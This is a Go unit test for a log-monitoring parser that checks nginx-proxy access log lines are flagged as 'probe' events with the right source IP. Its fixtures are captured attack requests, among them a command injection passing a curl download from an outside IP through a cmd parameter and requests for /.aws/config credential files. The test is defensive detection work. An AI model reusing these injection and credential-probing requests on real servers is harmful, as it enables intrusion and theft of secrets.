package logmon

import (
	"testing"
	"time"

	"github.com/boonkerz/roster/internal/shared"
)

// Echte Zeilen eines nginxproxy/nginx-proxy-Containers (forego-Präfix mit ANSI-Farben, vhost-Format).
func TestNginxProxyLive(t *testing.T) {
	src := shared.LogSource{ID: "p", Name: "proxy", Type: "docker", Target: "nginx-proxy", Format: "nginx_access"}
	lines := []struct {
		raw  string
		kind string
		ip   string
	}{
		{"\x1b[0;33;1mnginx.1     | \x1b[0m_ 194.116.236.22 - - [01/Nov/2026:19:51:19 +0000] \"\\x03\\x00\\x00\\x13\\x0E\\xE0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x01\\x00\\x00\\x00\" 400 150 \"-\" \"-\" \"-\"\n", "probe", "194.116.236.22"},
		{"\x1b[0;33;1mnginx.1     | \x1b[0m167.235.143.119 77.90.185.118 - - [01/Nov/2026:19:55:46 +0000] \"GET /PBX.php?cmd=curl%20http://138.124.36.220/bxe HTTP/1.1\" 503 190 \"-\" \"Mozilla/5.0 zgrab/0.x\" \"-\"\n", "probe", "77.90.185.118"},
		{"\x1b[0;33;1mnginx.1     | \x1b[0mpruefplaketten-peter.de 176.34.143.149 - - [01/Nov/2026:19:56:29 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0 (compatible; DefaultsExposed/1.0; +https://defaults.exposed/headers)\" \"172.18.0.3:80\"\n", "", ""},
		{"\x1b[0;33;1mnginx.1     | \x1b[0m167.235.143.119 103.215.74.112 - - [01/Nov/2026:20:00:24 +0000] \"GET /.aws/config HTTP/1.1\" 503 592 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\" \"-\"\n", "probe", "103.215.74.112"},
		{"2026-11-01T20:00:24.031413860Z \x1b[0;33;1mnginx.1     | \x1b[0m167.235.143.119 103.215.74.112 - - [01/Nov/2026:20:00:24 +0000] \"GET /.aws/config HTTP/1.1\" 503 592 \"-\" \"x\" \"-\"\n", "probe", "103.215.74.112"},
		{`{"log":"\u001b[0;33;1mnginx.1     | \u001b[0m167.235.143.119 103.215.74.112 - - [01/Nov/2026:20:00:24 +0000] \"GET /.aws/config HTTP/1.1\" 503 592 \"-\" \"x\" \"-\"\n","stream":"stdout","time":"2026-11-01T20:00:24.031413860Z"}` + "\n", "probe", "103.215.74.112"},
	}
	for i, l := range lines {
		ev, ok := Parse(src, Unwrap(l.raw), time.Now())
		if l.kind == "" {
			if ok {
				t.Errorf("%d: kein Ereignis erwartet, got %+v", i, ev)
			}
			continue
		}
		if !ok || ev.Kind != l.kind || ev.SourceIP != l.ip {
			t.Errorf("%d: got ok=%v %+v, want %s %s", i, ok, ev, l.kind, l.ip)
		}
	}
}
